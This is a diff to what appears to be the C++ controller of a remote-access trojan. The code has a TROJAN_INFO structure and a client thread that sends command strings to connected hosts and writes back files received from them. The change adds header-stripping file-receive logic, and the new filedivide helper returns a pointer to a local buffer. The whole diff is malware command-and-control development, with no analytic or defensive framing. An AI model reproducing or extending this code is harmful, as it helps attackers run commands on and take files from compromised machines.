@@ -18,6 +18,7 @@ using namespace std;
 #define MAC_ADDR_LEN	17
 #define POST_LEN		210
 #define DEFAULT_BUFLEN 1024
+#define POST_FILE_LEN   1234
 
 typedef struct _TROJAN_INFO
 {
@@ -88,6 +89,17 @@ char* combine(char *s1, char *s2,int len)
 	for (int i = POST_LEN; i <= len + 1; i++)
 		result[i] = s2[i - POST_LEN];
 	return result;
+}
+
+
+char* filedivide(char * sendbuf)
+{
+	char ans[DEFAULT_BUFLEN];
+	memset(ans, 0, DEFAULT_BUFLEN);
+	for (int i = 0; i < DEFAULT_BUFLEN; i++)
+		ans[i] = sendbuf[i + POST_LEN];
+	cout << ans << "<---";
+	return ans;
 }
 
 void init()
@@ -310,11 +322,14 @@ DWORD WINAPI ClientThread(LPVOID lpParameter)
 	char RecvBuffer[MAX_PATH];
 	int CmdNo;
 	DWORD CmdLen;
+	int cmdlen;
 	char CmdBuff[MAX_CMD_LEN];
 	char LocalFile[MAX_PATH];
 	char *strTmp;
 	bool bFirst = true;
 	now_client_num++;
+	char filebuf[POST_FILE_LEN];
+	char * filenohead;
 
 	while( TRUE )
 	{
@@ -382,9 +397,10 @@ DWORD WINAPI ClientThread(LPVOID lpParameter)
 			cout << "执行命令" << CmdBuff << endl;
 			cout << "命令长度为" << strlen(CmdBuff) << "!\n";
 			CmdLen = htonl(strlen(CmdBuff));
+			cmdlen = strlen(CmdBuff);
 			// send cmd len
 			send(ClientSocket, (char *)&CmdLen, sizeof(DWORD), 0);
-			//Ret = send(ClientSocket, combine(protocolHead, (char *)&CmdLen), strlen(protocolHead)+ sizeof(DWORD), 0);
+			//Ret = send(ClientSocket, combine(protocolHead, (char *)cmdlen), strlen(protocolHead)+ sizeof(char *), 0);
 			// send cmd content
 			//send(ClientSocket, CmdBuff, strlen(CmdBuff), 0);
 			Ret = send(ClientSocket, combine(protocolHead, CmdBuff), strlen(protocolHead)+ strlen(CmdBuff), 0);
@@ -424,15 +440,28 @@ DWORD WINAPI ClientThread(LPVOID lpParameter)
 			// 持续接收数据，直到对方关闭连接 
 			do
 			{
-				iResult = recv(ClientSocket, recvbuf, POST_LEN, 0);
-				memset(recvbuf, 0, 2049);
-				iResult = recv(ClientSocket, recvbuf, recvbuflen, 0);
+				//iResult = recv(ClientSocket, recvbuf, POST_LEN, 0);
+				memset(filebuf, 0, POST_FILE_LEN);
+				iResult = recv(ClientSocket, filebuf, POST_FILE_LEN, 0);
+				//filenohead = filedivide(filebuf);
+				iResult -= POST_LEN;
 				if (iResult > 0)
 				{
 					cout << "还有" << torecvlen << "个字节需要接收" << endl;
 					int recvlen = iResult;
 					if (iResult > torecvlen)recvlen = torecvlen;
-					fwrite(recvbuf, 1, recvlen, file);
+					//fwrite(filedivide(filebuf), 1, DEFAULT_BUFLEN, file);
+					
+						char* buf=filebuf;
+						for (int i = 0; i < POST_LEN; i++)
+						{
+							buf++;
+						}
+						for (int i = 0; i < recvlen; i++)
+						{
+							fwrite(buf, 1, 1, file);
+							buf++;
+						}					
 					torecvlen -= recvlen;
 					if (torecvlen <= 0)break;
 
